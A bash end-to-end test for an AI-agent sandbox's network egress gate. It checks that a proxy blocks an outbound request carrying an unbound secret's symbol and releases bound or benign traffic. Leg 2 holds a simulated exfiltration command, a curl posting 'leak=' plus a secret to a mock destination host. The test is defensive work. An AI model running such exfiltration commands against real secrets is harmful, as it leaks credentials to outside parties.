#!/usr/bin/env bash
#
# net-proxy-live.test.sh — LIVE e2e oracle: the Mandu NETWORK egress gate is a
# real, unprivileged chokepoint wired through `mandu-run.sh --net-proxy`, in the
# `secrets` protection mode (confidentiality ON, integrity OFF).
#
# Proves the network exfiltration kill-switch END-TO-END through the launcher: the
# launcher autostarts the cooperative forward proxy (interceptors/net-proxy),
# points the agent's HTTP_PROXY at it, and an outbound request carrying a
# SECRET's $MDU:* symbol (a file labelled `no-model` with NO binding) bound for
# an unbound destination is BLOCKED (HTTP 403, rule `egress:secret-unbound`,
# confidentiality.md §3.2) so the secret never reaches the destination. Two
# controls show the gate decides on the label, not on the token's shape: the
# SAME request carrying a secret BOUND to the destination is released (the
# destination receives the real value, never the token), and a benign,
# symbol-free request passes through and DOES reach the destination.
#
# Why this matters: it demonstrates the OS-level network egress data-usage gate
# holding with NO MITM/CA (TLS inspection is switched off here with
# --no-net-proxy-mitm; the HTTPS form is net-proxy-mitm-live.test.sh) and NO
# agent cooperation: a secret's symbol cannot be exfiltrated to an unbound sink
# even off the model path.
#
# The integrity form of this suite (an UNTRUSTED symbol blocked, integrity ON)
# is frozen at launcher/test/integrity/net-proxy-live.test.sh
# (protection-modes.md §10.7).
#
# Offline + unprivileged: a real arbiter daemon on a temp socket + isolated symbol
# DB / event dir / admin socket; a mock destination HTTP server that records what
# it received, listening on a kernel-assigned port it reports through a port file;
# the launcher autostarts the net-proxy on a kernel-assigned port (it prints the
# port in its banner) and reaps it on exit. No port is picked and released ahead
# of time (test-organization.md §8.4). The launches get a throwaway HOME and
# workspace so the launcher's secret walk scans neither the developer's home nor
# the repo. Everything under a temp dir, reaped (group-kill the arbiter) on exit.
#
# SKIPs cleanly (exit 0) when curl / node / npm are unavailable, the arbiter /
# net-proxy deps are not installed, or 127.0.0.2 cannot be bound — those are
# environment gaps, not failures. An arbiter that never comes up (or refuses
# the setup calls) is a FAILURE, with its log's last lines.
#
# Run:  bash launcher/test/net-proxy-live.test.sh
#
set -uo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAUNCHER="$HERE/../mandu-run.sh"
# mandu-run.sh now shims the TS launcher, which turns ON every rung by default.
# This oracle tests ONLY the net-proxy egress gate, so isolate it: disable the
# other rungs via env (fs-sync's worktree, the kernel confines, the exec-wrap that
# would block the symbol-bearing curl before it reaches the proxy, the model proxy,
# the reply filter) so the 403 is attributable to net-proxy alone.
export MANDU_FS_SYNC=0 MANDU_NO_KERNEL=1 MANDU_NO_CONTEXT_PROXY=1 MANDU_EXEC_WRAP=0 MANDU_REPLY_FILTER=0
# The rung banners this oracle greps print only under --verbose since the
# one-line default display (launch-banner.ts, release checklist a6).
export MANDU_VERBOSE=1
# This suite STATES its axes (docs/design/architecture/protection-modes.md §4): the arbiter it
# spawns and the launcher it runs both read these, so a change of the built-in
# default can never quietly change what the suite proves. STRICT makes an
# unstated axis a startup error in the arbiter. `secrets`: confidentiality ON,
# integrity OFF.
export MANDU_AXES_STRICT=1 MANDU_INTEGRITY=0 MANDU_CONFIDENTIALITY=1
REPO_ROOT="$(cd "$HERE/../.." && pwd)"
ARBITER_DIR="$REPO_ROOT/arbiter"
ARBITER_MAIN="$ARBITER_DIR/ipc/server-main.ts"
ARBITER_TSX="$ARBITER_DIR/node_modules/.bin/tsx"
EGRESS_DIR="$REPO_ROOT/interceptors/net-proxy"

PASS=0
FAIL=0
pass() { echo "PASS: $1"; PASS=$((PASS + 1)); }
fail() { echo "FAIL: $1"; FAIL=$((FAIL + 1)); }

skip() {
  echo "SKIP: $1"
  echo "─────────────────────────────────────────"
  echo "net-proxy-live.test.sh: 0 passed, 0 failed (skipped)"
  exit 0
}

# A broken run, not a missing prerequisite: the arbiter this suite started did
# not come up, or refused the setup calls. FAIL with why and the log's last
# lines (scripts/lib/ready-deadline.sh), never SKIP: a suite that goes quiet
# must not show green.
abort() {
  echo "FAIL: $1"
  if [[ -n "${2:-}" ]]; then mdu_log_tail "$2"; fi
  echo "─────────────────────────────────────────"
  echo "net-proxy-live.test.sh: $PASS passed, $((FAIL + 1)) failed"
  exit 1
}

# ── 0. environment gates (skip, not fail, on a missing toolchain) ─────────────
command -v curl >/dev/null 2>&1 || skip "curl not on PATH — cannot drive the proxy"
command -v node >/dev/null 2>&1 || skip "node not on PATH — cannot run the mock destination / arbiter client"
command -v npm  >/dev/null 2>&1 || skip "npm not on PATH — the launcher cannot autostart the net-proxy"
[[ -x "$ARBITER_TSX" ]] || skip "arbiter tsx not installed ($ARBITER_TSX) — run 'cd arbiter && npm install'"
[[ -f "$EGRESS_DIR/package.json" && -d "$EGRESS_DIR/node_modules" ]] \
  || skip "net-proxy deps not installed ($EGRESS_DIR) — run 'cd interceptors/net-proxy && npm install'"

# ── 1. scratch dirs + a real arbiter daemon on a temp socket ───────────────────
WORK="$(mktemp -d "${TMPDIR:-/tmp}/mandu-netegress-live.XXXXXX")" || skip "mktemp failed"
# The Mandu home: a temp one under $WORK with no config.toml, so no host
# ~/.mandu/config.toml is read (the 7cdfc2c e2e rule) and nothing lands in the
# real home; the arbiter and every launch below inherit it.
export MANDU_HOME="$WORK/mandu-home"
# The runtime base (the instance registry, the human-plane socket, the
# launches' scope dirs): the suite's own, never the caller's
# $XDG_RUNTIME_DIR/mandu (test-organization.md §8.5).
export MANDU_RUNTIME_DIR="$WORK/rt"
ARBITER_SOCK="$WORK/arbiter.sock"
ADMIN_SOCK="$WORK/admin.sock"
FAKE_HOME="$WORK/home"
SECRETS_DIR="$WORK/secrets"
# The launches run in a throwaway HOME and workspace: the launcher's secret
# walk (on in `secrets`) covers both, and must scan neither the developer's
# home nor this repository.
WS="$WORK/ws"
mkdir -p "$FAKE_HOME" "$SECRETS_DIR" "$WS"

# The mock destination binds to an ALTERNATE loopback IP (127.0.0.2), NOT
# 127.0.0.1. This is deliberate and CRITICAL: the launcher's NO_PROXY excludes
# `127.0.0.1,localhost,::1` (so the anthropic-proxy/U-LLM loopback channels are NOT
# routed through the egress proxy). A destination ON 127.0.0.1 would therefore be
# bypassed by curl and never hit the gate. 127.0.0.2 is still loopback (reachable,
# no privilege) but is NOT in NO_PROXY, so curl routes it THROUGH the egress proxy
# — exercising the gate exactly as a real remote destination would.
# Since 2026-10-05 the net-proxy relays nothing to this machine (127.0.0.2
# included: blocked-destinations.ts), so the agent addresses the destination by
# a NAME, $DEST_NAME, that a mock-sites host route (MANDU_NET_PROXY_MOCK_SITES,
# the replay runner's network fixture) sends to the listener; the gate judges
# the name, the route only changes where an allowed request is dialed. Leg (4b)
# checks the listener's own address through the proxy is refused.
DEST_HOST="127.0.0.2"
DEST_NAME="dest.mandu.test"

arbiter_pid=""
mock_pid=""
cleanup() {
  if [[ -n "$mock_pid" ]]; then kill "$mock_pid" 2>/dev/null || true; fi
  # Group-kill the arbiter (tsx -> node child) if we started one.
  if [[ -n "$arbiter_pid" ]]; then
    mdu_stop_group "$arbiter_pid"
  fi
  rm -rf "$WORK" 2>/dev/null || true
}
trap cleanup EXIT
# Lifeline backstop (lib/lifeline.sh): reaps the arbiter if this shell dies
# without its trap (SIGKILL / abandoned hang).
source "$(dirname "${BASH_SOURCE[0]}")/lib/lifeline.sh"
mdu_lifeline_init "$WORK"

# ── 1a. the mock destination: port 0 + a port file (no free_port race) ────────
# Writes each received request body (one line per request) to $RECV. An EMPTY/
# missing file therefore proves the destination received NOTHING. It binds port
# 0 itself and publishes the bound port (atomic tmp+rename), so no other process
# can take the port between choosing and binding it (test-organization.md §8.4).
RECV="$WORK/received.txt"
MOCK_PORT_FILE="$WORK/mock.port"
: > "$RECV"
echo "[1/?] starting the mock destination on $DEST_HOST (kernel-assigned port) ..."
node -e '
  const http = require("http");
  const fs = require("fs");
  const [host, portFile, recv] = process.argv.slice(1);
  const srv = http.createServer((req, res) => {
    const chunks = [];
    req.on("data", (c) => chunks.push(c));
    req.on("end", () => {
      fs.appendFileSync(recv, Buffer.concat(chunks).toString("utf8") + "\n");
      res.writeHead(200, { "content-type": "text/plain" });
      res.end("ok");
    });
  });
  srv.on("error", (e) => { process.stderr.write("mock-dest: " + e.message + "\n"); process.exit(3); });
  srv.listen(0, host, () => {
    fs.writeFileSync(portFile + ".tmp", String(srv.address().port));
    fs.renameSync(portFile + ".tmp", portFile);
  });
' "$DEST_HOST" "$MOCK_PORT_FILE" "$RECV" >"$WORK/mock.log" 2>&1 &
mock_pid=$!
tries=100
while (( tries-- > 0 )); do
  [[ -s "$MOCK_PORT_FILE" ]] && break
  # Some minimal namespaces only expose 127.0.0.1: SKIP cleanly, rather than fail.
  kill -0 "$mock_pid" 2>/dev/null || { cat "$WORK/mock.log" >&2; skip "cannot bind $DEST_HOST (alternate loopback unavailable) — cannot place a non-NO_PROXY destination"; }
  sleep 0.05
done
MOCKPORT="$(cat "$MOCK_PORT_FILE" 2>/dev/null)"
[[ "$MOCKPORT" =~ ^[0-9]+$ ]] || { cat "$WORK/mock.log" >&2; skip "the mock destination never reported its port"; }
echo "      mock destination up on $DEST_HOST:$MOCKPORT (pid $mock_pid), recording to $RECV."
ROUTES="$WORK/routes.yaml"
printf 'hosts:\n  - host: "%s"\n    to: "%s:%s"\n' "$DEST_NAME" "$DEST_HOST" "$MOCKPORT" > "$ROUTES"

echo "[1a/?] booting the arbiter daemon on $ARBITER_SOCK ..."
# setsid → own process group so cleanup can group-kill the whole tsx->node tree.
# MANDU_ADMIN_SOCK: the admin channel `setPathLabel` (the user's labelling act)
# is accepted on. MANDU_POLICY_FILE: never the host's policy file.
setsid env MANDU_ARBITER_SOCK="$ARBITER_SOCK" \
           MANDU_ADMIN_SOCK="$ADMIN_SOCK" \
           MANDU_HOME="$MANDU_HOME" \
           MANDU_POLICY_FILE=/dev/null/mandu-test-no-policy.yaml \
           MANDU_LIFELINE=stdin \
  "$ARBITER_TSX" "$ARBITER_MAIN" "$ARBITER_SOCK" <"$MANDU_LIFELINE_FIFO" 9>&- >"$WORK/arbiter.log" 2>&1 &
arbiter_pid=$!

# The readiness budget (scripts/lib/ready-deadline.sh, runtime-instances.md
# §14.6): load-aware, doubled on CI; the wait ends at once if the daemon exits.
# shellcheck source=scripts/lib/ready-deadline.sh
. "$REPO_ROOT/scripts/lib/ready-deadline.sh"
ready_ms="$(mdu_ready_deadline_ms)"
# A start that does not come up FAILS the suite (with the log's last lines),
# never SKIPs it: the prerequisites were all checked above.
mdu_wait_sockets "$arbiter_pid" "$ready_ms" "$ARBITER_SOCK" "$ADMIN_SOCK" \
  || abort "the arbiter did not come up: $(mdu_ready_why $? "$ready_ms")" "$WORK/arbiter.log"
echo "      arbiter up (pid $arbiter_pid)."

# One NDJSON request over a unix socket; prints the first response line.
arb_call() {
  node -e '
    const net = require("net");
    const c = net.connect(process.argv[1], () => c.write(process.argv[2] + "\n"));
    let buf = "";
    c.setEncoding("utf8");
    c.on("data", (d) => {
      buf += d;
      const nl = buf.indexOf("\n");
      if (nl < 0) return;
      c.end();
      process.stdout.write(buf.slice(0, nl));
      process.exit(0);
    });
    c.on("error", (e) => { process.stderr.write(String(e)); process.exit(1); });
    setTimeout(() => { process.stderr.write("arbiter call timed out"); process.exit(1); }, 5000);
  ' "$1" "$2"
}

# ── 1b. REGISTER two real secrets in the arbiter ──────────────────────────────
# mint_secret FILE CANARY BINDINGS_JSON → prints the secret's $MDU: symbol.
# The user labels the file `no-model` over the ADMIN channel (optionally bound
# to destinations it may be released to), then the file is registered as a
# secret; the arbiter hands back its `$MDU:nomodel_…` symbol. That symbol is
# what the agent would hold in place of the bytes.
mint_secret() {
  printf '%s' "$2" > "$1"
  local lbl reg
  lbl="$(arb_call "$ADMIN_SOCK" "{\"id\":1,\"op\":\"setPathLabel\",\"path\":\"$1\",\"confidentiality\":\"no-model\",\"bindings\":$3}")"
  [[ "$lbl" == *'"ok":true'* ]] || { echo "setPathLabel failed: $lbl" >&2; return 1; }
  reg="$(arb_call "$ARBITER_SOCK" "{\"id\":2,\"op\":\"registerSecret\",\"path\":\"$1\"}")"
  printf '%s' "$reg" | node -e 'let s="";process.stdin.on("data",(d)=>s+=d).on("end",()=>{try{process.stdout.write((JSON.parse(s).result||{}).symbol||"")}catch{}})'
}
echo "[1b/?] labelling + registering two secrets (one unbound, one bound to $DEST_NAME) ..."
SECRET="TOPSECRET_$$_$RANDOM"
BOUND_SECRET="BOUNDSECRET_$$_$RANDOM"
SYMBOL="$(mint_secret "$SECRETS_DIR/deploy-token.txt" "$SECRET" '[]' 2>"$WORK/mint.err")"
BOUND_SYMBOL="$(mint_secret "$SECRETS_DIR/partner-key.txt" "$BOUND_SECRET" "[\"$DEST_NAME\"]" 2>>"$WORK/mint.err")"
if [[ "$SYMBOL" != '$MDU:nomodel_'* || "$BOUND_SYMBOL" != '$MDU:nomodel_'* ]]; then
  cat "$WORK/mint.err" >&2 || true
  abort "could not register the secrets via the arbiter — got: '$SYMBOL' / '$BOUND_SYMBOL'" "$WORK/arbiter.log"
fi
echo "      unbound secret symbol: $SYMBOL"
echo "      bound secret symbol:   $BOUND_SYMBOL  (bound to $DEST_NAME)"

# One launch through the launcher: $1 = the stderr file, $2 = the agent's
# command; extra env (MANDU_TEST_SYM) comes from the caller. MANDU_NET_PROXY_PORT=0:
# the launcher starts the net-proxy on a kernel-assigned port and reads it back
# from the proxy's port file (services/net-proxy.ts), then prints it in the
# "net-proxy LIVE" banner, which is how the reap check below finds it.
launch() {
  ( cd "$WS" && \
  HOME="$FAKE_HOME" \
  MANDU_ARBITER_SOCK="$ARBITER_SOCK" \
  MANDU_NO_ARBITER_AUTOSTART=1 \
  MANDU_NET_PROXY_PORT=0 \
  MANDU_NET_PROXY_MOCK_SITES="$ROUTES" \
  bash "$LAUNCHER" --target claude --net-proxy --no-net-proxy-mitm --no-scope --no-mcp -- \
    bash -c "$2" 2>"$1" )
}
# The net-proxy port a launch used, read off its banner.
proxy_port_of() {
  grep -o 'cooperative egress gate on http://127\.0\.0\.1:[0-9]*' "$1" 2>/dev/null | head -1 | sed 's/.*://'
}
check_wired() {
  if grep -q "proceeding WITHOUT the network egress gate" "$1"; then
    echo "--- launcher stderr (degraded) ---" >&2; cat "$1" >&2
    fail "launcher degraded out of --net-proxy — the network gate was NOT wired (see stderr above)"
  fi
}

# ── 2. EXFIL attempt: the UNBOUND secret's symbol → MUST be BLOCKED ────────────
# curl honors HTTP_PROXY for the $DEST_NAME destination (which is NOT in
# NO_PROXY), so the request reaches the gate. The arbiter denies it (a no-model
# secret at an unbound destination: `egress:secret-unbound`, a human
# declassification is required, confidentiality.md §3.2) → 403, and the request
# never reaches the mock destination. The 403 body the agent receives names the
# rule, so the block is attributed to the confidentiality gate, not to a
# broken proxy.
#
# CRITICAL quoting: pass the symbol to the AGENT via an env var (MANDU_TEST_SYM)
# and reference it SINGLE-QUOTED in the inner command so neither this test's shell
# nor the launcher re-expands the literal `$MDU:*` token. Only the agent's
# curl-running bash expands $MANDU_TEST_SYM, putting the real symbol on the wire.
# The BARE registered symbol is sent: a `$MDU:…[id].field` tail the table does
# not know would not be the registered secret.
echo "[2/?] EXFIL of an unbound secret through the launcher (expect curl 403, dest receives NOTHING) ..."
exfil_out="$(
  MANDU_TEST_SYM="$SYMBOL" \
  launch "$WORK/exfil.err" 'curl -s -o "'"$WORK"'/exfil.body" -w "%{http_code}" --data "leak=${MANDU_TEST_SYM}" http://'"${DEST_NAME}"'/'
)"
exfil_rc=$?
check_wired "$WORK/exfil.err"
echo "      curl http_code: '$exfil_out' (launcher rc=$exfil_rc)"
if [[ "$exfil_out" == "403" ]]; then
  pass "EXFIL request carrying an unbound secret's symbol → curl saw 403 (the egress gate BLOCKED it)"
else
  echo "--- launcher stderr (exfil) ---" >&2; cat "$WORK/exfil.err" >&2
  fail "EXFIL request was NOT blocked; expected curl '403', got '$exfil_out'"
fi
if grep -q "egress:secret-unbound" "$WORK/exfil.body" 2>/dev/null; then
  pass "the 403 names the confidentiality rule egress:secret-unbound (the block is the secret's label)"
else
  fail "the 403 body does not name egress:secret-unbound: '$(head -c 400 "$WORK/exfil.body" 2>/dev/null)'"
fi
# The destination must have received NOTHING for the exfil attempt.
recv_after_exfil="$(cat "$RECV" 2>/dev/null)"
if [[ -z "$recv_after_exfil" ]]; then
  pass "the destination received NOTHING (the secret never left the proxy)"
else
  fail "the destination RECEIVED data on the blocked exfil: $recv_after_exfil"
fi
# And the raw secret must not have leaked anywhere the destination could see.
if [[ "$recv_after_exfil" == *"$SECRET"* ]]; then
  fail "the raw secret LEAKED to the destination: $recv_after_exfil"
fi

# ── 3. CONTROL: the BOUND secret's symbol → RELEASED at its bound host ─────────
# The same request shape, a secret whose label binds it to $DEST_NAME: the gate
# allows it (`egress:secret-bound-trusted`) and the proxy puts the REAL value
# back on the wire. This shows the gate reads the symbol and decides on its
# label: the 403 above is the unbound label's verdict, not a proxy that drops
# every request carrying a token.
echo "[3/?] CONTROL: a secret bound to $DEST_NAME (expect curl 200, dest receives the real value, not the token) ..."
: > "$RECV"
bound_out="$(
  MANDU_TEST_SYM="$BOUND_SYMBOL" \
  launch "$WORK/bound.err" 'curl -s -o /dev/null -w "%{http_code}" --data "key=${MANDU_TEST_SYM}" http://'"${DEST_NAME}"'/'
)"
bound_rc=$?
check_wired "$WORK/bound.err"
echo "      curl http_code: '$bound_out' (launcher rc=$bound_rc)"
recv_after_bound="$(cat "$RECV" 2>/dev/null)"
if [[ "$bound_out" == "200" && "$recv_after_bound" == *"key=$BOUND_SECRET"* ]]; then
  pass "CONTROL: the bound secret was released at its bound host (dest received the real value)"
else
  echo "--- launcher stderr (bound) ---" >&2; cat "$WORK/bound.err" >&2
  fail "CONTROL: the bound secret was not released; curl '$bound_out', dest got '$recv_after_bound'"
fi
if [[ "$recv_after_bound" == *'$MDU:'* ]]; then
  fail "CONTROL: the token itself reached the bound host: $recv_after_bound"
else
  pass "CONTROL: the token itself never reached the bound host"
fi

# ── 4. BENIGN request: no symbol → MUST PASS and reach the destination ─────────
# The agent also reads the proxy's identity through its own HTTP_PROXY: the
# reap check below probes the same endpoint after exit, and this shows the
# probe does see a live proxy of this session.
echo "[4/?] BENIGN request through the launcher (expect curl 200, dest receives hello=world) ..."
: > "$RECV"
benign_out="$(
  launch "$WORK/benign.err" 'curl --noproxy "*" -s -m 5 "${HTTP_PROXY%/}/_mandu/identity" > "'"$WORK"'/identity.live"; curl -s -o /dev/null -w "%{http_code}" --data "hello=world" http://'"${DEST_NAME}"'/'
)"
benign_rc=$?
check_wired "$WORK/benign.err"
echo "      curl http_code: '$benign_out' (launcher rc=$benign_rc)"
if [[ "$benign_out" == "200" ]]; then
  pass "BENIGN symbol-free request → curl saw 200 (passed through the gate)"
else
  echo "--- launcher stderr (benign) ---" >&2; cat "$WORK/benign.err" >&2
  fail "BENIGN request did NOT pass; expected curl '200', got '$benign_out'"
fi
recv_after_benign="$(cat "$RECV" 2>/dev/null)"
if [[ "$recv_after_benign" == *"hello=world"* ]]; then
  pass "the destination RECEIVED the benign body (hello=world) — passthrough works"
else
  fail "the destination did NOT receive the benign body; got: '$recv_after_benign'"
fi

# ── 4b. THIS MACHINE: the listener's own address through the proxy → 403 ─────
# The net-proxy dials from outside the connect guard, so it relays nothing to
# this machine (blocked-destinations.ts, 2026-10-05): the same benign request
# to 127.0.0.2:<port> itself, sent through the proxy, is refused and the
# listener gets nothing. Only the route's own dial reaches it.
echo "[4b/?] the listener's own loopback address THROUGH the proxy (expect 403, dest receives nothing) ..."
: > "$RECV"
local_out="$(
  launch "$WORK/local.err" 'curl -s -o "'"$WORK"'/local.body" -w "%{http_code}" --noproxy "" -x "$HTTP_PROXY" --data "hello=local" http://'"${DEST_HOST}:${MOCKPORT}"'/'
)"
check_wired "$WORK/local.err"
if [[ "$local_out" == "403" ]] && grep -q "is this machine" "$WORK/local.body" 2>/dev/null; then
  pass "a loopback destination through the proxy → 403 (the proxy relays nothing to this machine)"
else
  echo "--- launcher stderr (local) ---" >&2; cat "$WORK/local.err" >&2
  fail "a loopback destination through the proxy was not refused: curl '$local_out', body '$(head -c 300 "$WORK/local.body" 2>/dev/null)'"
fi
if [[ -z "$(cat "$RECV" 2>/dev/null)" ]]; then
  pass "the listener received nothing through the proxy at its own address"
else
  fail "the listener RECEIVED a request at its own address through the proxy: $(cat "$RECV")"
fi

# ── 5. the launcher autostarted the net-proxy AND reaped it ────────────────────
echo "[5/?] checking the launcher autostarted the net-proxy and reaped it on exit ..."
# Plain-ASCII substring only (the launcher's "net-proxy LIVE …" banner uses an
# em-dash, which can be locale-fragile to grep) — the TS launcher's manager emits
# "net-proxy LIVE" on autostart (truth-in-labeling, services/manager.ts).
if grep -qF "net-proxy LIVE" "$WORK/exfil.err" "$WORK/bound.err" "$WORK/benign.err" 2>/dev/null; then
  pass "the launcher logged autostarting the net-proxy (LIVE network egress gate)"
else
  echo "--- launcher stderr (exfil) ---" >&2; cat "$WORK/exfil.err" >&2
  fail "the launcher did not log autostarting the net-proxy"
fi
if grep -qF "MITM:" "$WORK/exfil.err" "$WORK/bound.err" "$WORK/benign.err" 2>/dev/null; then
  fail "TLS inspection was ON despite --no-net-proxy-mitm (this suite covers the plain proxy)"
fi
if grep -qF "\"arbiterSock\":\"$ARBITER_SOCK\"" "$WORK/identity.live" 2>/dev/null; then
  pass "the live net-proxy answered the identity probe with this session's arbiter"
else
  fail "the live net-proxy's identity did not name this session's arbiter: '$(cat "$WORK/identity.live" 2>/dev/null)'"
fi
# After every launcher invocation returned, each autostarted proxy should be gone
# (the launcher reaps it). Each launch's port comes from its banner (port 0 +
# the proxy's port file, no pre-picked port). A refused connect is the expected
# answer; the port being answered by something that is NOT this session's
# net-proxy (another process reused the freed port) also means ours is gone. Only
# an identity naming THIS arbiter is a proxy that outlived its launcher.
sleep 0.3
for leg in exfil bound benign; do
  port="$(proxy_port_of "$WORK/$leg.err")"
  if [[ -z "$port" ]]; then
    fail "could not read the net-proxy port off the $leg launch's banner"
    continue
  fi
  id="$(curl --noproxy '*' -s -m 2 "http://127.0.0.1:$port/_mandu/identity" 2>/dev/null)"
  if [[ "$id" == *"\"arbiterSock\":\"$ARBITER_SOCK\""* ]]; then
    fail "the $leg launch's net-proxy is STILL listening on $port after the launcher exited (not reaped)"
  else
    pass "the $leg launch's net-proxy (port $port) is gone after the launcher exited (autostarted proxy was reaped)"
  fi
done

# ── summary ───────────────────────────────────────────────────────────────────
echo "─────────────────────────────────────────"
echo "net-proxy-live.test.sh: $PASS passed, $FAIL failed"
if [[ "$FAIL" -gt 0 ]]; then
  exit 1
fi
exit 0
